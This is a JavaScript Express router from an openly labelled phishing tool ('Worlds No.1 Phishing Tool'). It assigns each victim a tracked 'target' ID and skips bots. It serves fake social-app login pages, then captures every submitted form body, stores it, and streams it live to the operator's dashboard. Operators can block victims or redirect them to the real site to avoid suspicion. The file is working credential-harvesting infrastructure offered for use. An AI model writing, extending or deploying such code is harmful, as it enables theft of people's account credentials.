/**
 * 
 * @Author      : Madhan (Madhanmaaz) - madhan hacker
 * github       : https://github.com/madhanmaaz
 * website      : http://madhanmaaz.netlify.app/
 * Description  : Worlds No.1 Phishing Tool.
 * 
 */

const express = require("express")
const { checkingPort, checkId, ssd, books } = require("../utils/utils")
const { checkApp } = require("../modules/apps")
const { v4: uuid } = require("uuid")
const app = express.Router()

app.get("/:appName", async (req, res) => { // creating the target
    const { appName } = req.params
    const device = req.device.type
    if (device == "bot") {
        return
    }

    // check apps
    if (checkApp(appName) == false) {
        res.send("<h1>APPLICATION NOT FOUND</h1>")
        return
    }

    const id = uuid()
    let port = await getRandomPort()
    const data = { // init target data
        id,
        appName,
        port,
        status: "none",
        time: new Date(),
        data: []
    }

    books.setItem(`${id}.json`, data)
    res.redirect(`/app/${appName}/${id}`)
})

app.route("/:appName/:id").get(async (req, res) => { // target get request
    const { appName, id } = req.params
    const device = req.device.type

    // check apps
    if (checkApp(appName) == false) {
        res.send("<h1>APPLICATION NOT FOUND</h1>")
        return
    }

    const config = checkId(id)
    if (config) { // checking if the target data is present
        if (config.status == "block") { // if the status is block then the response is block 
            res.send("<h1>you are blocked</h1>")
            return
        } else if (config.status == "redirect") { // if the status is redirect or spike-type is redirect then the response is config redirect 
            const redirects = ssd.getItem("redirects.json")
            const url = redirects[appName]
            config.status = "redirect"
            books.setItem(`${id}.json`, config)
            res.redirect(url)
            return
        }

        const socialApplication = require(`../modules/${appName}`)
        config["device"] = device

        const reponse = await socialApplication.init("getReq", config)
        res.send(reponse)
        return
    }

    res.sendStatus(500)
}).post(async (req, res) => { // target post request
    const body = req.body
    const { appName, id } = req.params
    const device = req.device.type

    // check apps
    if (checkApp(appName) == false) {
        res.send("<h1>APPLICATION NOT FOUND</h1>")
        return
    }

    const config = checkId(id)
    if (config) { // checking if the target data is present
        if (config.status == "block") { // if the status is block then the response is block 
            res.send("<h1>you are blocked</h1>")
            return
        } else if (config.status == "redirect" || body["spike-type"] == "redirect") { // if the status is redirect or spike-type is redirect then the response is config redirect 
            const redirects = ssd.getItem("redirects.json")
            const url = redirects[appName]
            config.status = "redirect"
            books.setItem(`${id}.json`, config)
            res.redirect(url)
            return
        }

        const socialApplication = require(`../modules/${appName}`)
        config.data.push(body)
        config["device"] = device
        config["body"] = body
        uiInterface = {}
        uiInterface["body"] = body
        uiInterface["id"] = id
        uiInterface["appName"] = appName

        global.io.emit("in-target-data", uiInterface)
        books.setItem(`${id}.json`, config)
        const response = await socialApplication.init("postReq", config)
        res.send(response)
        return
    }

    res.sendStatus(500)
})

async function getRandomPort() { // get random non used port
    const minPort = 11000
    const maxPort = 50000
    let checkPort
    let port

    do { // checking the unused port
        port = Math.floor(Math.random() * (maxPort - minPort + 1)) + minPort
        checkPort = await checkingPort(port)
    } while (checkPort == false)

    return port
}


module.exports = app